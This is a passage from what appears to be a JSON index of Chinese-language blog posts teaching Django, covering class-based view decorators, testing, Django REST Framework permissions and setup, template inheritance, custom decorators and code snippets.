django.utils.decorators import method_decorator from django.views.generic.base import View class MyView(View): @method_decorator(login_required) def dispatch(self, *args, **kwargs): return super(MyView, self).dispatch(*args, **kwargs) 带参数的装饰器用法：\n@method_decorator(login_required_by_role(\u0026lsquo;super\u0026rsquo;))\n3.2 修饰视图类 修饰类和修饰dispatch一样，也会影响全部HTTP方法。\n1 2 3 4 5 6 7 8 9 from django.contrib.auth.decorators import login_required from django.utils.decorators import method_decorator from django.views.generic.base import View @method_decorator(login_required) class MyView(View): def dispatch(self, *args, **kwargs): return super(MyView, self).dispatch(*args, **kwargs) 3.3 URLConf中配置装饰器 1 2 3 4 5 6 7 8 9 from django.contrib.auth.decorators import login_required, permission_required from django.views.generic import TemplateView from .views import VoteView urlpatterns = [ url(r\u0026#39;^about/$\u0026#39;, login_required(TemplateView.as_view(template_name=\u0026#34;secret.html\u0026#34;))), url(r\u0026#39;^vote/$\u0026#39;, permission_required(\u0026#39;polls.can_vote\u0026#39;)(VoteView.as_view())), ] 4. 参考 https://www.kawabangga.com/posts/1869 ","description":"","id":537,"section":"post","tags":["博文","Django","后端","Python","类视图"],"title":"Django 类视图","uri":"https://www.chenshaowen.com/blog/class-based-view-of-django.html"},{"content":"Django中写自动化测试可以使用：doctests或unit tests。自动化测试的逻辑是，将测试数据传入待测试函数，执行后，以输出结果与预期是否一致，作为判断测试是否通过的标准。这里有几个关键点，（1）需要测试数据，（2）需要指明待测试函数，（3）需要给出预期的结果。\n1. 测试驱动开发 测试驱动开发是一个迭代的开发周期，先编写自动化测试代码，再填充功能。\n第一步，先编写测试 第二步，查看测试失败的地方 第三步，编写足够的代码以使测试通过 第四步，再次测试 第五步，代码重构 第六步，重复以上操作 2. doctests doctests是Python内置的测试模块。\n由普通部分和执行部分组成。\n普通部分为注释部分 执行部分由\u0026rsquo;\u0026raquo;\u0026gt;\u0026rsquo;（python shell提示符）或\u0026rsquo;\u0026hellip;\u0026lsquo;提示符区分。 doctest搜索各个模块、类和函数中的docstring，把每个可执行部分当做一次测试范例运行。再将实际运行值和期望值，对比作为一次运行结果。\nmyfunction.py\n1 2 3 4 5 6 7 8 9 # -*- coding: utf-8 -*- import doctest def add(x, y): \u0026#34;\u0026#34;\u0026#34; \u0026gt;\u0026gt;\u0026gt; add(1, 2) 3 \u0026#34;\u0026#34;\u0026#34; return x + y 1 2 3 4 5 6 7 8 9 10 11 12 13 14 python -m doctest -v myfunction.py Trying: add(1, 2) Expecting: 3 ok 1 items had no tests: mytest 1 items passed all tests: 1 tests in myfunction.add 1 tests in 2 items. 1 passed and 0 failed. Test passed. v参数表示开启啰嗦模式，可以查看详情，如果不使用v参数，测试成功后不会有任何提示。如果测试不通过，则打印错误报告。\n3. unit tests Django的单元测试是基于类实现的，\n运行测试时，test runner会在目录的test*.py文件中寻找单元测试用例类（继承自TestCase），在测试类中执行test开头的函数。\nDjango内置了一些测试辅助类，比如Test Client、TestCase、Email Service。通过Client，可以方便的发起一个get或者post请求，并取得返回结果。TestCase是对unittest.TestCase进行了封装，省去了很多重复要写的代码，新增了一个self.client。Email Service提供了方便的邮件发送的方法。\n3.1 怎样写单元测试 Model部分的测试\n1 2 3 4 5 6 7 8 9 10 11 from django.test import TestCase from .models import Fruit class FruitTestCase(TestCase): # 初始化代码 def setUp(self): Fruit.objects.create(name=\u0026#34;apple\u0026#34;, price=10) def test_fruit(self): fruit= Fruit.objects.get(name=\u0026#39;apple\u0026#39;) self.assertEqual(fruit.price, 10) View部分的测试\n1 2 3 4 5 6 from django.test import TestCase class ViewTest(TestCase): def test_get(self): response = self.client.get(\u0026#39;/fruit/1/\u0026#39;) self.assertEqual(response.status_code, 200) 3.2 运行单元测试 1 2 3 4 5 6 # 搜索当前目录及子目录中test*.py文件，全部测试用例执行 python manage.py test # 运行某个测试类的全部用例 manage.py test myapp.FruitTestCase # 运行某个测试类中某一个用例 manage.py test myapp.FruitTestCase.test_fruit Django会自动在Model中创建测试数据，测试完后清除。如果想要保留测试数据，请执行单元测试时，带上\u0026ndash;keepdb参数。\n4. 参考 https://docs.python.org/3/library/doctest.html https://docs.djangoproject.com/en/dev/topics/testing/ ","description":"","id":538,"section":"post","tags":["博文","Django","测试","Demo","DevOps","CICD"],"title":"Django自动化测试","uri":"https://www.chenshaowen.com/blog/auto-testing-of-django.html"},{"content":"1. DRF的权限管理 Django REST Framework的权限管理包括两个部分。\n一个是认证Authentication方式。指定对用户进行鉴权的方式，获取request.user。 一个是权限控制Permissions。针对Django资源、用户类别进行权限控制。 1.1 认证方式 相关源码在rest_framework/authentication.py文件中。一共有三种认证方式：\nBasicAuthentication：HTTP基础认证。 前端将用户名和密码以Base64编码的形式，设置在Authorization HTTP头中，后端用以认证用户。\nTokenAuthentication：基于Token的认证。 使用Authorization HTTP头里面的Token认证用户。\nSessionAuthentication：使用Djnago的会话后台来认证。 使用Django Session Backend认证用户。\n自定义认证方式\nDRF还允许自定义认证方式，只需要继承BaseAuthentication类，并实现.authenticate(self, request)方法。\n1.2 权限控制方式 相关源码在rest_framework/permissions.py文件中。一共内置了七种权限控制的类别：\nAllowAny # 无限制。 IsAuthenticated # 登陆用户。 IsAdminUser # 管理员用户。 IsAuthenticatedOrReadOnly # 非登录用户只读。 DjangoModelPermissions # Mode级别的控制。 DjangoModelPermissionsOrAnonReadOnly # Model匿名只读。 DjangoObjectPermissions # 对象级别的控制。 自定义权限控制\n继承BasePermission自定义权限控制，实现其中一个或两个方法\nhas_permission(self, request, view)，访问这个接口时，会进行权限检测 has_object_permission(self, request, view, obj)，访问对象时才会进行权限检测 1.3 权限检测后的处理 DRF使用认证类去检测用户执行的请求。\n如果认证成功，request.user被设置为认证的User对象。 如果认证失败，request.user被设置为AnonymousUser。 认证失败，返回 HTTP 401，未经授权。\n权限检测失败，返回 HTTP 403，权限被拒绝。\n2. 权限控制应用 2.1 认证URL设置 1 2 3 urlpatterns = [ url(r\u0026#39;^api-auth/\u0026#39;, include(\u0026#39;rest_framework.urls\u0026#39;, namespace=\u0026#39;rest_framework\u0026#39;) ] 2.2 全局权限控制 在 settings.py 中可以设置全局默认权限\nsettings.py\n1 2 3 4 5 6 7 8 REST_FRAMEWORK = { \u0026#39;DEFAULT_AUTHENTICATION_CLASSES\u0026#39;: ( \u0026#39;rest_framework.authentication.SessionAuthentication\u0026#39;, ), \u0026#39;DEFAULT_PERMISSION_CLASSES\u0026#39;: ( \u0026#39;rest_framework.permissions.AllowAny\u0026#39;, ) } 2.3 ViewSet 的权限 1，设置 permission_classes 的类属性来给 viewset 设定权限。\nDRF 会检查元组内的每一个 premission，必须要全部通过才行。\n1 2 3 4 5 class UserViewSet(viewsets.ReadOnlyModelViewSet): queryset = User.objects.all() serializer_class = UserSerializer authentication_classes = (SessionAuthentication, ) permission_classes = (permissions.IsAuthenticated,) 2，使用authentication_classes、permission_classes装饰器。\n1 2 3 4 5 6 7 8 9 10 11 12 from rest_framework.authentication import SessionAuthentication, from rest_framework.permissions import IsAuthenticated from rest_framework.response import Response @authentication_classes((SessionAuthentication, BasicAuthentication)) @permission_classes((IsAuthenticated,)) def example_view(request, format=None): content = { \u0026#39;user\u0026#39;: unicode(request.user), \u0026#39;auth\u0026#39;: unicode(request.auth) } return Response(content) 2.4 自定义权限 定制Permissions, 只需继承BasePermission，然后实现其中一个或两个方法\nhas_permission(self, request, view)，访问这个接口时，会进行权限检测 has_object_permission(self, request, view, obj)，访问对象时才会进行权限检测 premissions.py\n1 2 3 4 5 6 7 8 9 10 11 from rest_framework import permissions class IsOwnerOrReadOnly(permissions.BasePermission): def has_permission(self, request, view): if request.method in permissions.SAFE_METHODS: return True def has_object_permission(self, request, view, obj): if request.method in permissions.SAFE_METHODS: return True 需要注意的是，如果自己实现了get_object，需要使用self.check_object_permissions(self.request, obj)进行权限的检查。\n1 2 3 4 def get_object(self): obj = get_object_or_404(self.get_queryset()) self.check_object_permissions(self.request, obj) return obj 3. 参考 https://www.idaima.com/article/10617 http://www.jianshu.com/p/4415d290ed10 http://www.django-rest-framework.org/api-guide/authentication/#how-authentication-is-determined https://my.oschina.net/duoduo3369/blog/612730 ","description":"","id":539,"section":"post","tags":["博文","Django","后端","安全","API","权限"],"title":"Django REST Framework 权限管理","uri":"https://www.chenshaowen.com/blog/permissions-of-django-rest-framework.html"},{"content":"Awesome-Django\nDjango应用、项目和资源集合\nDjango-Packages\n大量Django第三方组件。\nDjango-Mptt\n在数据库中存储层级数据结构。\nDjango-Rest-Framework\n自动生成 RESTful API。\nDjango-Rest-Framework-Jwt\n为Django-Rest-Framework提供Token鉴权。\nDjango-Tastypie\n自动生成 RESTful API。\nDjango-Cors-Headers\n解决跨域访问的问题。\nDjango-Ckeditor\nDjango富文本支持。\nDjango-Tinymce\nDjango富文本支持。\nDjango-Debug-Toolbar\n性能调试测试工具。\nDjango-Model-Utils\n提供很多有用的Field和Mixin。\nDjango-Storages\n用来存储图片、文件到不同后端的，比如亚马逊S3或者微软的Azure。\nDjango-Celery\n执行定时，后台任务。\nDjango-Contrib-Requestprovider\n利用中间件，随时获取到request对象。\nDjango-Guardian\nObject级别的权限控制。\nDjango-Redis\nRedis的Django支持。\nDjango-Redis-Cache\nRedis当做缓存的Django支持。\nDjango-Simple-Captcha\n提供Django的验证码支持。\nDjango-Social-Auth\n提供Django的第三方登录支持。\nDjango-Grappelli\n提供Django Admin增强。\nDjango-Extensions\nDjango框架的扩展功能集合，包括management命令扩展，数据库字段扩展，admin后台扩展等。\nDjango-Haystack\n提供Django全文检索引擎。\nDjango-Filter\n提供Django过滤增强。\nDjango-Webpack-Loader\nDjango+Webpack开发的支持。\nDjango-Import-Export\nDjango Model数据的导出，支持Excel、CSV、JSON等，支持Admin导出。\nDjango-Imagekit\nDjango图片处理增强。\nDjango-Websocket-Redis\nDjango使用Redis实现Websockets通信。\nDjango-Jquery-File-Upload\nDjango利用Jquery的文件上传增强。\nDjango-Scheduler\nDjango 日历管理。\nDjango-reCAPTCHA\nDjango验证码。\nDjango-Chartit\n使用Highchart和jQuery库，绘制Model数据图表。\nDjango-Braces\n内置大量类视图的Mixin。\nDjango-ratelimit\n限制 View 函数的访问频率。\nDjango-Xadmin\n替换 Django 原生 admin，Django 版本要求\u0026gt;=1.9\n","description":"","id":540,"section":"post","tags":["整理","Django","后端","组件"],"title":"Django 第三方组件 List","uri":"https://www.chenshaowen.com/blog/third-party-component-list-of-django.html"},{"content":"1. 场景 在一个项目中，header、footer等元素经常被重复使用。为了避免，每个页面重写这些元素，同时，在修改时，不用去每个页面修改，需要将公共的部分抽离出来，这就是Django模板继承。\n2. Django的复用模板标签 Django内建的复用模板标签主要有，block 、 extends、include\n首先我们来看一个例子：\n定义一个项目的公共模板base.html\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;UTF-8\u0026#34;\u0026gt; {% block title %} \u0026lt;title\u0026gt;My Project\u0026lt;/title\u0026gt; {% endblock %} \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h1\u0026gt;My base\u0026lt;/h1\u0026gt; {% block content %}{% endblock %} {% block footer %} \u0026lt;p\u0026gt;I am footer\u0026lt;/p\u0026gt; {% endblock%} \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 利用公共的base.html模板，定义首页index.html\n1 2 3 4 5 6 7 8 {% extends \u0026#34;base.html\u0026#34; %} {% block title%} \u0026lt;title\u0026gt;Home Page of My Project\u0026lt;/title\u0026gt; {% endblock %} {% block content %} \u0026lt;p\u0026gt; Home page content\u0026lt;/p\u0026gt; {% endblock %} 2.1 block 定义：\nblock定义一个模板块。子模板的block会覆盖父模板同名的block块。如果想要子模块不覆盖父模块的内容，而是新增，可以使用 block.super。\n用法：\n1 2 3 {% block index %} 子模板会替换父模板block index中的内容 {% endblock %} 1 2 3 4 {% block index %} {{ block.super }} 子模板新增的内容 {% endblock %} 2.2 extends 定义：\nextends表示的是继承。通常，一个项目会写一个base.html和若干widget.html。项目中的大部分页面，都会继承自base.html。\n用法：\nextends的参数一般为字符串，也可为变量。注意使用extends时，extends一定要是第一个tag标签，否则不会生效。\n1 {% extends \u0026#39;base.html\u0026#39; %} 定义：\ninclude将其他模板，以插件的形式，直接添加在当前的模板中。\n用法：\n可带路径、相对路径、使用变量名。\n1 {% include \u0026#39;tools.html\u0026#39; %} 2.3 其他模板标记 autoescape 控制模板的自动转义。 1 2 3 {% autoescape off %} Hello {{ name }} {% endautoescape %} load加载标签库。 1 2 {% load staticfiles %} \u0026lt;img src=\u0026#34;{% static \u0026#34;images/hi.jpg\u0026#34; %}\u0026#34; /\u0026gt; 还可以在自定义标签。比如在INSTALLED_APPS 中添加\u0026rsquo;django.contrib.humanize\u0026rsquo;后，可以在模板中使用 load humanize。需要注意的是，load的标签不会被子模板继承。\n3. Mako Mako是一个高性能的Python模板库，它的语法借鉴了很多其他的模板库，如Django、Jinja2等等。同时，Mako不依赖其他Web框架，可以直接用于html的生成。首次编译时，Mako将HTML模板编译成Python文件，大大提高了渲染和生成页面的速度。\nMako\n\u0026lt;%include\u0026gt; 接受一个文件名称作为参数，引用一个文件。\n\u0026lt;%def\u0026gt; 定义一个Python函数：\n1 2 3 4 5 \u0026lt;%def name=\u0026#34;myfunc(x)\u0026#34;\u0026gt; this is myfunc, x is ${x} \u0026lt;/%def\u0026gt; ${myfunc(7)} \u0026lt;%inherit\u0026gt; 用于模板的继承。\n1 \u0026lt;%inherit file=\u0026#34;base.html\u0026#34;/\u0026gt; \u0026lt;%call\u0026gt; 用于调用\u0026lt;%def\u0026gt;定义的Python函数。\nparent 继承链中父模板的名称空间。parent.head()，在index.html子模板中引用父模板的内容。\nnext 继承链中下一个模板的名称空间。next.body() 的位置决定了，子页面不在block的内容，被渲染的位置。也可使用 self.body()，但 self.body() 只渲染最终页面不在block中的内容，不渲染中间继承页面不在block的内容。\n1 2 3 4 5 6 7 8 9 10 11 12 \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; {% block title %}{% endblock %} \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; {% block content %}{% endblock %} \u0026lt;/body\u0026gt; \u0026lt;%block name=\u0026#34;js\u0026#34;\u0026gt; {% endblock %} ${next.body()} \u0026lt;/html\u0026gt; 4. 参考 http://docs.makotemplates.org/en/latest/inheritance.html ","description":"","id":541,"section":"post","tags":["博文","Django","模板"],"title":"Django 模板继承","uri":"https://www.chenshaowen.com/blog/django-template-inherit.html"},{"content":"作者: 阮一峰\n出版社: 电子工业出版社\n出版年: 2014-8-1\nISBN: 9787121238369\n电子版\n","description":"","id":542,"section":"post","tags":["书籍","JavaScript","前端"],"title":"ECMAScript 6 入门","uri":"https://www.chenshaowen.com/blog/book/the-101-of-ecma-script.html"},{"content":" 在前后端分离开发过程中，提供给前端的 API 接口，有的使用 GET 请求，有的使用 POST 请求。为了避免，后端在 views.py 的 request 中取值报错，需要在每个 view 函数中判断请求头的方法。于是，提取了一个公共的函数放在 utils.py 中，以便 view 函数引用。使用时依然繁琐，最后，在 Django 文档中找到了require_http_methods 装饰器轻松解决。本文主要介绍装饰器的基本概念，Django 装饰器实现的方法。\n1. 基本概念 装饰器模式 装饰器模式允许，动态地扩展额外的功能，而不需要改变原来的结构。下图，表示的就是，装饰器动态扩展功能的特性。\nPython装饰器 Python装饰器是装饰器模式的Python实现，实际上，就是函数包装器。Python解释器加载函数时，执行包装器。包装器可以修改函数接收的参数和返回值。\n2. 对请求方法过滤 如果不使用装饰器，需要实现函数is_post_method_return_true_or_err_resp ，从request中获取请求的方法，进行判断。当判定为否时，返回一个 HttpResponse 对象。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 # -*- coding: utf-8 -*- import json from django.http import HttpResponse def is_post_method_return_true_or_err_resp(request): if request.method == \u0026#34;POST\u0026#34;: return True, None else: return False, HttpResponse( json.dumps({ \u0026#34;result\u0026#34;: False, \u0026#34;data\u0026#34;: [], \u0026#34;message\u0026#34;: u\u0026#34;请使用POST方法\u0026#34;, \u0026#34;code\u0026#34;: -1 }), content_type=\u0026#39;application/json\u0026#39;) 在使用时，在 view 函数中，调用 utils 中判断的函数即可。\n1 2 3 4 5 def my_view(request): checked, error_resp = is_post_method_return_true_or_err_resp(request) if checked: return error_resp pass 3. Django装饰器 上面的实现方式，每次调用函数，都需要判断返回值，return 一个 HttpResponse。能不能将这部分也提取出来呢？当然可以，Django 提供了相应的装饰器。\n1 2 3 4 5 from django.views.decorators.http import require_GET @require_POST def my_view(request): pass 上面的 @require_POST，是 Python 中使用装饰器的语法糖。只需要一行代码，就给 view 函数，装配上仅限POST方法的功能。\n如果使用GET方法访问，Django 会返回给浏览器：\nGET YOUR_URL 405 (METHOD NOT ALLOWED)\n4. 写一个装饰器 为了更进一步了解装饰器的原理和实现方法，这里使用Python实现一个 my_require_http_methods 装饰器，传入允许的请求方法列表。如果，请求的方法被允许，继续执行，否则返回错误提示。\n4.1 一个简单的装饰器 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 import json from django.http import HttpResponse def is_post_method(func): def my_function(request, *args, **kwargs): if request.method == \u0026#34;POST\u0026#34;: # do somthing return func(request, *args, **kwargs) else: # do something return HttpResponse( json.dumps({ \u0026#34;result\u0026#34;: False, \u0026#34;data\u0026#34;: [], \u0026#34;message\u0026#34;: u\u0026#34;请使用POST方法\u0026#34;, \u0026#34;code\u0026#34;: -1 }), content_type=\u0026#39;application/json\u0026#39;) return my_function 在 view 函数前面增加 @is_post_method，即可。\n1 2 3 @is_post_method def my_view(request): pass 上面的调用过程为：\n1 is_post_method(my_view)() 被装饰器修饰的 my_view 函数作为参数，调用 is_post_method 函数。首先执行的是，my_function 函数，然后是 my_vew 函数。\n4.2 带参数的装饰器 如果装饰器新增的功能，需要传入参数怎么办呢？装饰器可以理解为一个闭包，将函数当做参数，然后返回一个绑定变量的函数。利用闭包，在外层，再定义一个高阶的函数，用于参数的传递。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 def required_method(method_list): def _required_method_decorator(func): def my_function(request, *args, **kwargs): if request.method in method_list: return func(request, *args, **kwargs) else: return HttpResponse( json.dumps({ \u0026#34;result\u0026#34;: False, \u0026#34;data\u0026#34;: [], \u0026#34;message\u0026#34;: u\u0026#34;请使用%s方法\u0026#34; % \u0026#34;、\u0026#34;.join(method_list), \u0026#34;code\u0026#34;: -1 }), content_type=\u0026#39;application/json\u0026#39;) return my_function return _required_method_decorator 在 view 函数前面增加 @required_method，带上允许的方法列表参数，即可。\n1 2 3 @required_method([\u0026#39;POST\u0026#39;]) def my_view(request): pass 上面的调用过程为：\n1 required_method([\u0026#39;POST\u0026#39;])(my_view)() 装饰器函数中，method_list=['POST']，func=my_view\n4.3 元信息恢复 1 2 3 @required_method([\u0026#39;GET\u0026#39;]) def home(request): print home.__name__ # 输出 my_function 打印函数名，会发现被装饰器修饰过的函数，name属性被修改。不仅仅是name属性，元信息比如名字、文档字符串、注解和参数签名都丢失了。\n为了解决这个问题，Django 的 utils.functional 包提供 wraps 装饰器来恢复元信息。最终的代码如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 import json from django.utils.functional import wraps from django.http import HttpResponse def required_method(method_list): def _required_method_decorator(func): @wraps(func) def my_function(request, *args, **kwargs): if request.method in method_list: return func(request, *args, **kwargs) else: return HttpResponse( json.dumps({ \u0026#34;result\u0026#34;: False, \u0026#34;data\u0026#34;: [], \u0026#34;message\u0026#34;: u\u0026#34;请使用%s方法\u0026#34; % \u0026#34;、\u0026#34;.join(method_list), \u0026#34;code\u0026#34;: -1 }), content_type=\u0026#39;application/json\u0026#39;) return my_function return _required_method_decorator 5. 参考 https://my.oschina.net/leejun2005/blog/477614#OSC_h1_8 ","description":"","id":543,"section":"post","tags":["博文","Django","Demo","装饰器","Python"],"title":"Django 装饰器","uri":"https://www.chenshaowen.com/blog/django-decorator.html"},{"content":"1. Admin 自动注册全部 Model 字段 admin.py\n1 2 3 4 5 6 7 8 9 10 # -*- coding: utf-8 -*- import inspect from django.contrib import admin from . import models for name, obj in inspect.getmembers(models): try: if inspect.isclass(obj): admin.site.register(getattr(models, name)) except Exception as e: pass 2. 获取全部 View Name 获取 Project 全部 View Name\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 from django.conf import settings from django.core.urlresolvers import RegexURLResolver, RegexURLPattern root_urlconf = __import__(settings.ROOT_URLCONF) all_urlpatterns = root_urlconf.urlpatterns VIEW_NAMES = [] # maintain a global list def get_all_view_names(urlpatterns): global VIEW_NAMES for pattern in urlpatterns: if isinstance(pattern, RegexURLResolver): get_all_view_names(pattern.url_patterns) # call this function recursively elif isinstance(pattern, RegexURLPattern): view_name = pattern.callback.func_name # get the view name VIEW_NAMES.append(view_name) # add the view to the global list return VIEW_NAMES get_all_view_names(all_urlpatterns) 获取 App 全部 View Name\n1 2 3 from my_app.urls import urlpatterns as my_app_urlpatterns my_app_views = get_all_view_names(my_app_urlpatterns) 3. Admin 中 ManyToMany Field 支持搜索 models.py\n1 2 class SomeModel(models.Model): users = models.ManyToMany(User) admin.py\n1 2 class SomeModelAdmin(admin.ModelAdmin): filter_horizontal = (\u0026#39;users\u0026#39;,) 4. Model 中 Choices 使用 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 # -*- coding: utf-8 -*- from enum import Enum class ChoiceEnum(Enum): @classmethod def choices(cls): return tuple((x.name, x.value) for x in cls) @classmethod def choices_name(cls): return tuple(x.name for x in cls) @classmethod def choices_value(cls): return tuple(x.value for x in cls) @classmethod def get_name(cls, value): if value in cls.choices_value(): return cls.choices_name()[cls.choices_value().index(value)] else: return \u0026#39;\u0026#39; @classmethod def get_value(cls, name): if name in cls.choices_name(): return cls.choices_value()[cls.choices_name().index(name)] else: return \u0026#39;\u0026#39; class Colors(ChoiceEnum): RED = \u0026#39;red\u0026#39; WHITE = \u0026#39;white\u0026#39; BLUE = \u0026#39;blue\u0026#39; models.py\n1 2 class Desk(models.Model): color = models.CharField(max_length=32, choices=Colors.choices(), default=Colors.RED.name) console 中\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 print Colors.choices() ((\u0026#39;BLUE\u0026#39;, \u0026#39;blue\u0026#39;), (\u0026#39;RED\u0026#39;, \u0026#39;red\u0026#39;), (\u0026#39;WHITE\u0026#39;, \u0026#39;white\u0026#39;)) print Colors.RED.value red print Colors.get_name(Colors.RED.value) RED print Colors.choices_value() (\u0026#39;blue\u0026#39;, \u0026#39;red\u0026#39;, \u0026#39;white\u0026#39;) print Colors.choices_name() (\u0026#39;BLUE\u0026#39;, \u0026#39;RED\u0026#39;, \u0026#39;WHITE\u0026#39;) 5. 字符串与时间相互转换 将字符串转换为时间对象 1 2 3 from datetime import datetime print datetime.strptime(\u0026#39;2017-09-02 17:41:20\u0026#39;, \u0026#39;%Y-%m-%d %H:%M:%S\u0026#39;) datetime.datetime(2017, 9, 2, 17, 41, 20) 将时间对象转换为字符串 1 2 3 from datetime import datetime print datetime.now().strftime(\u0026#39;%Y-%m-%d %H:%M:%S\u0026#39;) \u0026#39;2017-09-30 09:50:57\u0026#39; 6. 组装装饰器 1 2 3 4 5 6 7 8 9 10 11 12 13 14 def compose_decorators(*funs): \u0026#34;\u0026#34;\u0026#34; 按照顺序组装装饰器 @A @B @C 等价于 @compose_decorators(A, B，C) \u0026#34;\u0026#34;\u0026#34; def deco(f): for fun in reversed(funs): f = fun(f) return f return deco ","description":"","id":544,"section":"post","tags":["博文","Django","Demo"],"title":"Django Snippets","uri":"https://www.chenshaowen.com/blog/snippets-of-django.html"},{"content":" 笔者从事的SaaS开发，对开发效率有着比较高的要求。从项目立项、原型设计评估、需求确定、前端设计、后台开发到最后的验收，几个星期完成一次迭代。在敏捷开发的指导下，开始推行前后端分离模式。前端专注于页面和交互，后端专注于API接口。后端提供API，涉及权限认证、参数校验、异常处理、分页等一系列问题。同时，这些功能在项目之间又存在共性，寻找合适的API脚手架十分迫切。笔者之前研究过Django Restful接口之Tastypie，相比较于Tastypie的简易、快速上手，Django REST Framework（DRF）需要更多的配置，同时功能更加强大，可以用于快速开发API接口。\n1. 功能简介 支持 OAuth 认证 支持对 ORM 和非 ORM 数据源的序列化 丰富的定制层级：函数视图、类视图、视图集合 内置Mixins，可以用于快速组装 2. 基本概念 Serializer序列化 序列化是将 Python 数据结构转换为其它数据格式，比如将Django Model映射到Json。\n序列化是提供了数据的验证和渲染功能。其工作方式类似于 Django Form，基于 Field 进行字段验证。序列化之后的数据保存在 serializer.data中的，可以使用 SomeRenderer().render(serializer.data) 将其序列化为字符串对象作为 Response body 返回。\nViewSet视图 DRF 通过 View 提供 API 接口，一个 View 可以对应多个 Renderer，针对不同的渲染条件提供不同的输出格式（HTML／XML／JSON）。\nViewSet 则是 View 的一个封装，一个 ViewSet 可以为同一个 URL 根据请求方法提供不同的接口。尤其是 ModelViewSet 会自动根据 Model 的定义生成 REST 接口和 URL，能够快速生成网站的一整套 API。\nRequest对象。 DRF使用Requests对象扩展了原生的HttpRequest，并提供了更灵活的请求处理。Requests对象的核心属性就是request.data，可以处理任意数据，接受POST、PUT和PATCH方法。\n3. DRF处理流程 4. DRF应用 DRF的使用主要分为三步：定义资源 - 实现HTTP方法 - 配置URL。\n4.1 安装配置 1 pip install djangorestframework 在settings.py的INSTALLED_APPS中加入：\n1 2 3 4 5 INSTALLED_APPS = ( ... \u0026#39;rest_framework\u0026#39;, ... ) 4.2 定义资源，实现序列化 models.py\n1 2 3 4 5 from django.db import models class Fruit(models.Model): name = models.CharField(u\u0026#39;名称\u0026#39;, default=\u0026#34;\u0026#34;, max_length=255) price = models.FloatField(u\u0026#34;单价\u0026#34;, default=0) serializers.py\n1 2 3 4 5 6 7 from rest_framework import serializers from .models import Fruit class FruitSerializer(serializers.HyperlinkedModelSerializer): class Meta: model = Fruit fields = (\u0026#39;name\u0026#39;, \u0026#39;price\u0026#39;) 4.3 继承View，重写HTTP Method views.py\n1 2 3 4 5 6 7 8 from rest_framework.viewsets import ModelViewSet from .models import Fruit from .serializers import FruitSerializer class FruitViewSet(ModelViewSet): queryset = Fruit.objects.all() serializer_class = FruitSerializer FruitViewSet直接继承ModelViewSet，ModelViewSet继承了一系列Mixins类的HTTP方法。如果需要自定义HTTP方法，可以继承APIView类，或者Mixins类，还可以完全自定义。\n4.4 配置URL urls.py\n1 2 3 4 5 6 7 8 9 10 from django.conf.urls import patterns, url, include from rest_framework import routers from .views import FruitViewSet router = routers.DefaultRouter() router.register(r\u0026#39;fruit\u0026#39;, FruitViewSet) urlpatterns = [ url(r\u0026#39;^api/v1/\u0026#39;, include(router.urls)), ] 配置到此，一个基本的API接口已经完成。访问http://localhost:8000/api/v1/，会显示：\n4.5 权限 1 2 3 4 5 REST_FRAMEWORK = { \u0026#39;DEFAULT_PERMISSION_CLASSES\u0026#39;: [ \u0026#39;rest_framework.permissions.DjangoModelPermissionsOrAnonReadOnly\u0026#39; ] } 4.6 分页控制 1 2 3 class YourView(BaseView): paginate_by = 10 # 覆盖 settings 中的默认分页 max_paginate_by = 100 # 限制最大分页大小 也可以动态地去判断最大分页大小：\n1 2 3 4 5 class YouView(BaseView): ... def paginate_queryset(self, queryset): self.paginator.max_page_size = YOUR_PAGE_SIZE_LIMIT return super(YouView, self).paginate_queryset(queryset) 4.7 外键处理 1 2 3 4 5 6 7 8 9 10 11 12 13 from rest_framework import serializers class HospitalSerializer(serializers.HyperlinkedModelSerializer): class Meta: model = Hospital fields = \u0026#39;__all__\u0026#39; class HospitalPicSerializer(serializers.HyperlinkedModelSerializer): hospital = HospitalSerializer() class Meta: model = HospitalPic fields = \u0026#39;__all__\u0026#39; 4.8 流量限制 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 REST_FRAMEWORK = { \u0026#39;DEFAULT_THROTTLE_CLASSES\u0026#39;: ( \u0026#39;rest_framework.throttling.AnonRateThrottle\u0026#39;, \u0026#39;rest_framework.throttling.UserRateThrottle\u0026#39; ), \u0026#39;DEFAULT_THROTTLE_RATES\u0026#39;: { \u0026#39;anon\u0026#39;: \u0026#39;100/day\u0026#39;, \u0026#39;user\u0026#39;: \u0026#39;1000/day\u0026#39; } } class ExampleView(APIView): throttle_classes = (UserRateThrottle,) def get(self, request, format=None): content = { \u0026#39;status\u0026#39;: \u0026#39;request was permitted\u0026#39; } return Response(content) 限制API查询的频率，可以根据用户不同，精确到每天、每小时、每分钟。\n4.9 Mixins Django-rest-framework为我们提供了许多现成的mixins，可以用于快速组合接口。\nGenericAPIView提供了view核心的功能 ListModelMixin提供了.list()方法 CreateModelMixin提供了.create()方法 在View函数中，可以这样使用：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 from .models import Fruit from .serializers import FruitSerializer from rest_framework import mixins from rest_framework import generics class FruitList(mixins.ListModelMixin, mixins.CreateModelMixin, generics.GenericAPIView): queryset = Fruit.objects.all() serializer_class = FruitSerializer def get(self, request, *args, **kwargs): return self.list(request, *args, **kwargs) def post(self, request, *args, **kwargs): return self.create(request, *args, **kwargs) 5. 参考 http://www.django-rest-framework.org/ http://www.django-rest-framework.org/api-guide/throttling/#throttling https://darkcooking.gitbooks.io/django-rest-framework-cn/content/ https://blog.windrunner.me/python/web/django-rest-framework.html http://www.atjiang.com/django-rest-tut5-relationships-and-hyperlinked-apis/ http://sillygod-blog.logdown.com/posts/663369 https://segmentfault.com/a/1190000004401112 